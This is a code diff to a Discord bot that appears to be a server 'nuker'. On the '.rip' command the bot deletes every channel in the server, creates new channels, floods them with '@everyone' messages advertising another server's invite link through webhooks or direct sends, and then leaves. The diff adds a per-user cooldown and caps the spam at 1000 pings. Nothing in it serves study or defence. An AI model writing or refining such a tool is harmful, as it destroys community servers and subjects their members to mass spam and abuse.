@@ -29,6 +29,10 @@ app.listen(PORT, () => {
   console.log(`🌐 Web server running on http://localhost:${PORT}`);
 });
 
+// ====== COOLDOWN LOGIC ======
+const cooldowns = new Map(); // userId -> timestamp
+const cooldownDuration = 10 * 60 * 1000; // 10 minutes in ms
+
 // ====== BOT LOGIC ======
 client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}`);
@@ -36,8 +40,27 @@ client.on('ready', () => {
 
 client.on('messageCreate', async (message) => {
   if (message.content === '.rip' && !message.author.bot) {
+    const authorId = message.author.id;
+
+    // Check cooldown
+    if (cooldowns.has(authorId)) {
+      const expirationTime = cooldowns.get(authorId) + cooldownDuration;
+      if (Date.now() < expirationTime) {
+        const timeLeft = Math.ceil((expirationTime - Date.now()) / 1000);
+        try {
+          await message.reply(`⏳ Please wait ${timeLeft} seconds before using .rip again.`);
+        } catch {}
+        return;
+      }
+    }
+
+    // Start cooldown
+    cooldowns.set(authorId, Date.now());
+
     const guild = message.guild;
     const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
+    let pingCount = 0;
+    const maxPings = 1000;
 
     // Delete all channels
     guild.channels.cache.forEach(async (channel) => {
@@ -78,10 +101,12 @@ client.on('messageCreate', async (message) => {
       } catch {}
     }
 
-    // Spam each channel with 20 messages, using webhook or direct send
+    // Spam each channel with up to 20 messages using webhook or fallback
     const spamTasks = [];
 
     for (const channel of createdChannels) {
+      if (pingCount >= maxPings) break;
+
       try {
         // Try creating a webhook
         const webhook = await channel.createWebhook({
@@ -89,23 +114,28 @@ client.on('messageCreate', async (message) => {
           avatar: 'https://i.imgur.com/6QbX6yA.png '
         });
 
-        // Send 20 messages via webhook
-        for (let i = 0; i < 20; i++) {
+        const spamLimit = Math.min(20, maxPings - pingCount);
+
+        // Send spamLimit messages via webhook
+        for (let i = 0; i < spamLimit; i++) {
           spamTasks.push(
             webhook.send(spamMessage).catch(async () => {
-              // If webhook fails, fallback to channel.send()
               try {
                 await channel.send(spamMessage);
+                pingCount++;
               } catch {}
             })
           );
+          pingCount++;
         }
-      } catch (webhookError) {
-        // If webhook creation failed, fallback to sending directly
-        for (let i = 0; i < 20; i++) {
+      } catch {
+        // If webhook creation failed, fallback to direct send
+        const spamLimit = Math.min(20, maxPings - pingCount);
+        for (let i = 0; i < spamLimit; i++) {
           spamTasks.push(
             channel.send(spamMessage).catch(() => {})
           );
+          pingCount++;
         }
       }
     }
@@ -113,12 +143,12 @@ client.on('messageCreate', async (message) => {
     // Run all spam tasks concurrently
     await Promise.all(spamTasks);
 
-    // Leave the server immediately
+    // Leave server once done
     try {
       await guild.leave();
     } catch {}
 
-    // Optional: Destroy client session to reduce load
+    // Optional: Destroy client session
     client.destroy();
   }
 });
